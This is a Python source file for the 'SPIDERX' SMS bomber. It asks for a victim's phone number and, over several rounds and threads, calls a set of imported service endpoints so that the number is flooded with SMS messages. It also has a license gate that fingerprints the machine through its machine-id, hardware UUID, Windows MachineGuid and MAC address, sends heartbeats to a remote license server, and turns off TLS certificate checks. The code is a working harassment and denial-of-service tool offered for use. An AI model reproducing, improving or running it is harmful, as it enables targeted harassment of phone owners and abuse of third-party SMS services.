from requests import post, get
from user_agent import generate_user_agent
from colorama import Fore, init
from os import system, name
from concurrent.futures import ThreadPoolExecutor
from time import sleep, time
from datetime import timedelta
from pathlib import Path
import sys
import json
import base64
import uuid
import hashlib
import threading
import datetime
import urllib3

from pystyle import Colors, Colorate, Center

from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.serialization import (
    Encoding, PublicFormat, PrivateFormat, NoEncryption
)

from api import SERVICES

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init()

g = Fore.GREEN
w = Fore.WHITE
r = Fore.RED
y = Fore.YELLOW
b = Fore.LIGHTBLACK_EX
re = Fore.RESET

# ==================== LICENSE MANAGER ====================
class LicenseManager:
    API_BASE = "https://spiderxcheat.pingbaz.space/sms-bomber/api.php"
    CONFIG_DIR = Path.home() / ".spiderx_sms"

    def __init__(self):
        self.CONFIG_DIR.mkdir(parents=True, exist_ok=True)
        self.device_id = self._get_device_id()
        self.private_key, self.public_key_pem = self._load_or_create_keys()
        self.access_token = None
        self.session_id = None
        self._lock = threading.Lock()

    # ---------- STABLE DEVICE ID ----------
    def _get_device_id(self):
        id_file = self.CONFIG_DIR / "device.id"
        if id_file.exists():
            val = id_file.read_text().strip()
            if val:
                return val

        parts = []

        # Linux /etc/machine-id
        for path in ("/etc/machine-id", "/var/lib/dbus/machine-id"):
            try:
                v = Path(path).read_text().strip()
                if v:
                    parts.append(v)
                    break
            except Exception:
                continue

        # DMI product UUID
        try:
            v = Path("/sys/class/dmi/id/product_uuid").read_text().strip()
            if v:
                parts.append(v)
        except Exception:
            pass

        # Windows MachineGuid
        if sys.platform == "win32":
            try:
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SOFTWARE\Microsoft\Cryptography"
                )
                v, _ = winreg.QueryValueEx(key, "MachineGuid")
                parts.append(v)
            except Exception:
                pass

        # MAC address ONLY if not randomly generated (bit 0x01 of first octet)
        node = uuid.getnode()
        if not ((node >> 40) & 0x01):
            parts.append(f"mac:{node:012x}")

        # Last-resort fallback
        if not parts:
            parts.append(uuid.uuid4().hex)
            print(f"{y}[!] No stable hardware ID found, using random UUID{re}")

        raw = "|".join(parts)
        device_id = str(uuid.uuid5(uuid.NAMESPACE_DNS, raw))
        id_file.write_text(device_id)
        return device_id

    # ---------- PERSISTENT RSA KEY ----------
    def _load_or_create_keys(self):
        key_file = self.CONFIG_DIR / "private.pem"
        if key_file.exists():
            try:
                pem = key_file.read_bytes()
                pk = serialization.load_pem_private_key(pem, password=None)
                pub = pk.public_key()
                pub_pem = pub.public_bytes(
                    Encoding.PEM, PublicFormat.SubjectPublicKeyInfo
                ).decode()
                return pk, pub_pem
            except Exception as e:
                print(f"{y}[!] Failed to load persisted key: {e}{re}")

        pk = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        pub_pem = pk.public_key().public_bytes(
            Encoding.PEM, PublicFormat.SubjectPublicKeyInfo
        ).decode()

        pem = pk.private_bytes(Encoding.PEM, PrivateFormat.PKCS8, NoEncryption())
        key_file.write_bytes(pem)
        try:
            key_file.chmod(0o600)
        except Exception:
            pass
        return pk, pub_pem

    # ---------- TOKEN PERSISTENCE ----------
    def _token_file(self, license_key):
        h = hashlib.sha256(license_key.encode()).hexdigest()[:16]
        return self.CONFIG_DIR / f"token_{h}.json"

    def load_token(self, license_key):
        f = self._token_file(license_key)
        if f.exists():
            try:
                data = json.loads(f.read_text())
                self.access_token = data.get("access_token")
                self.session_id = data.get("session_id")
                return bool(self.access_token)
            except Exception:
                pass
        return False

    def save_token(self, license_key):
        if not self.access_token:
            return
        f = self._token_file(license_key)
        f.write_text(json.dumps({
            "access_token": self.access_token,
            "session_id": self.session_id
        }))

    # ---------- RSA SIGNING ----------
    def _sign(self, action):
        ts = int(time())
        nonce = uuid.uuid4().hex
        data = f"{self.device_id}|{ts}|{nonce}|{action}".encode()
        sig = self.private_key.sign(
            data,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return {
            "access_token": self.access_token,
            "device_id": self.device_id,
            "timestamp": ts,
            "nonce": nonce,
            "signature": base64.b64encode(sig).decode()
        }

    # ---------- API CALLS ----------
    def activate(self, license_key):
        payload = {
            "license_key": license_key,
            "device_id": self.device_id,
            "public_key": self.public_key_pem,
            "device_model": "PC/Python",
            "android_version": "N/A",
            "app_version": "1.0.0"
        }
        try:
            r = post(f"{self.API_BASE}?action=activate", json=payload,
                     timeout=15, verify=False)
            data = r.json()
            if data.get("success"):
                self.access_token = data.get("access_token")
                self.session_id = data.get("session_id")
                return True, data
            return False, data
        except Exception as e:
            return False, {"error": f"NETWORK: {e}"}

    def validate(self):
        if not self.access_token:
            return False, {"error": "NO_TOKEN"}
        payload = self._sign("validate")
        try:
            r = post(f"{self.API_BASE}?action=validate", json=payload,
                     timeout=15, verify=False)
            return r.json().get("success", False), r.json()
        except Exception as e:
            return False, {"error": f"NETWORK: {e}"}

    def heartbeat(self):
        with self._lock:
            if not self.access_token:
                return
            try:
                post(f"{self.API_BASE}?action=heartbeat",
                     json=self._sign("heartbeat"),
                     timeout=5, verify=False)
            except Exception:
                pass

    def start_heartbeat(self):
        def loop():
            while True:
                sleep(60)
                self.heartbeat()
        threading.Thread(target=loop, daemon=True).start()

# =========================================================

class Counter:
    def __init__(self):
        self.value = 0
        self.start_time = time()
        self.rounds = 0

    def increment(self):
        self.value += 1

    def increment_round(self):
        self.rounds += 1

    def get_elapsed_time(self):
        return timedelta(seconds=int(time() - self.start_time))

def _bn():
    print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter("""

 ███████╗██████╗ ██╗██████╗ ███████╗██████╗ ██╗  ██╗
 ██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
 ███████╗██████╔╝██║██║  ██║█████╗  ██████╔╝ ╚███╔╝
 ╚════██║██╔═══╝ ██║██║  ██║██╔══╝  ██╔══██╗ ██╔██╗
 ███████║██║     ██║██████╔╝███████╗██║  ██║██╔╝ ██╗
 ╚══════╝╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝

                    t.me/SPIDERXCODE
""")))

def _cs():
    system('cls' if name == 'nt' else 'clear')

def _res(counter, phone, total_services):
    _cs()
    _bn()
    out = f"""
╔{'═'*37}╗
║{'RESULTS'.center(37)}║
╠{'═'*37}╣
║ Target     > {phone.ljust(23)}║
║ Services   > {str(total_services).ljust(23)}║
║ Successful > {str(counter.value).ljust(23)}║
║ Rounds     > {str(counter.rounds).ljust(23)}║
║ Time       > {str(counter.get_elapsed_time()).ljust(23)}║
╚{'═'*37}╝
"""
    print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter(out)))

def _sq(service_name, number, counter):
    try:
        api_func = SERVICES.get(service_name)
        if not api_func:
            print(f"{r}{service_name.ljust(15)} unknown service{re}")
            return
        response = api_func(number)
        if response.status_code in (200, 201, 202):
            print(f"{g}{service_name.ljust(15)} Sent     ({response.status_code}){re}")
            counter.increment()
        else:
            print(f"{r}{service_name.ljust(15)} Not Sent ({response.status_code}){re}")
    except Exception as e:
        print(f"{r}{service_name.ljust(15)} Error    {e}{re}")

# ==================== LICENSE GATE ====================
def check_license():
    lm = LicenseManager()
    _cs()
    _bn()
    print(f"\n{w}========= LICENSE VERIFICATION ========={re}\n")
    print(f"{b}Device ID       : {lm.device_id}{re}")
    print(f"{b}Public Key Hash : {hashlib.sha256(lm.public_key_pem.encode()).hexdigest()[:32]}{re}\n")

    license_key = input(f"{w}License Key > {re}").strip()
    if not license_key:
        print(f"{r}License key is required.{re}")
        return False

    # ---------- Try cached token first ----------
    if lm.load_token(license_key):
        print(f"{y}Cached session found, validating...{re}")
        ok, vdata = lm.validate()
        if ok:
            exp = vdata.get("expires_at", 0)
            if exp:
                print(f"{g}Authorized. Expires: "
                      f"{datetime.datetime.fromtimestamp(exp)}{re}")
            lm.start_heartbeat()
            print(f"{g}Heartbeat started.{re}\n")
            sleep(1)
            return True
        print(f"{y}Cached session invalid: "
              f"{vdata.get('error', 'UNKNOWN')}. Re-activating...{re}")

    # ---------- Activate ----------
    print(f"{y}Activating license...{re}")
    ok, data = lm.activate(license_key)

    if ok:
        lm.save_token(license_key)
        print(f"{g}Activated successfully.{re}")
        ok2, vdata = lm.validate()
        if not ok2:
            print(f"{r}Post-activation validation failed: "
                  f"{vdata.get('error', 'UNKNOWN')}{re}")
            return False
        exp = vdata.get("expires_at", 0)
        if exp:
            print(f"{g}Expires: {datetime.datetime.fromtimestamp(exp)}{re}")
        lm.start_heartbeat()
        print(f"{g}Heartbeat started.{re}\n")
        sleep(1)
        return True

    # ---------- Activation failed ----------
    err = data.get("error", "UNKNOWN") if isinstance(data, dict) else str(data)
    print(f"{r}Activation failed: {err}{re}")

    if err == "DEVICE_MISMATCH":
        print(f"\n{y}[!] License is bound to a different device.{re}")
        print(f"{y}    This happens when:{re}")
        print(f"{y}      - Key was already activated elsewhere{re}")
        print(f"{y}      - Key was bound with different device_id / public_key{re}")
        print(f"{y}      - You ran an OLD version of the script that generated a random ID{re}")
        print(f"{y}\n    To fix:{re}")
        print(f"{y}      1. Ask the admin to RESET the license binding for this key{re}")
        print(f"{y}      2. Or purchase / use a NEW license key{re}")
        print(f"{y}\n    Your new stable device_id has been saved to:{re}")
        print(f"{b}      {lm.CONFIG_DIR / 'device.id'}{re}")
        print(f"{b}      {lm.CONFIG_DIR / 'private.pem'}{re}")
        print(f"{y}    Future runs will use the same identity.{re}")
        return False

    # Sometimes ALREADY_ACTIVE returns a token anyway
    if isinstance(data, dict) and data.get("access_token"):
        lm.access_token = data["access_token"]
        lm.session_id = data.get("session_id")
        lm.save_token(license_key)
        print(f"{g}Activation returned a token. Validating...{re}")
        ok2, vdata = lm.validate()
        if ok2:
            lm.start_heartbeat()
            print(f"{g}Authorized.{re}\n")
            sleep(1)
            return True
        print(f"{r}Validation failed: {vdata.get('error', 'UNKNOWN')}{re}")

    return False
# =======================================================

def main():
    if not check_license():
        print(f"\n{r}Exiting: license verification failed.{re}")
        sys.exit(1)

    _cs()
    _bn()

    try:
        phone = input(f"{w}Phone (10 digits) > {re}").strip()
        if not phone.isdigit() or len(phone) != 10:
            print(f"{r}Invalid phone number.{re}")
            sys.exit(1)

        try:
            rounds = int(input(f"{w}Rounds > {re}") or 1)
            if rounds < 1:
                raise ValueError
        except ValueError:
            print(f"{r}Rounds must be >= 1.{re}")
            sys.exit(1)

        try:
            _mt = int(input(f"{w}Threads > {re}") or 5)
            if _mt < 1:
                raise ValueError
        except ValueError:
            print(f"{r}Threads must be >= 1.{re}")
            sys.exit(1)

        try:
            time_sleep = float(input(f"{w}Sleep between rounds (s) > {re}") or 1)
            if time_sleep < 0:
                raise ValueError
        except ValueError:
            print(f"{r}Invalid sleep value.{re}")
            sys.exit(1)

        _cs()
        _bn()

        services = list(SERVICES.keys())
        if not services:
            print(f"{r}api.py not found or empty.{re}")
            sys.exit(1)

        counter = Counter()
        total_services = len(services)

        print(f"\n{w}Starting...{re}")
        print(f"{w}Services available > {total_services}{re}\n")

        for current_round in range(1, rounds + 1):
            print(f"{w}Round {current_round}/{rounds}{re}")
            counter.increment_round()

            with ThreadPoolExecutor(max_workers=_mt) as executor:
                args = [(s, phone, counter) for s in services]
                executor.map(lambda x: _sq(*x), args)

            if current_round < rounds:
                sleep(time_sleep)

        _res(counter, phone, total_services)

    except KeyboardInterrupt:
        print(f"\n{r}Cancelled.{re}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{r}Error: {e}{re}")
        sys.exit(1)

if __name__ == "__main__":
    main()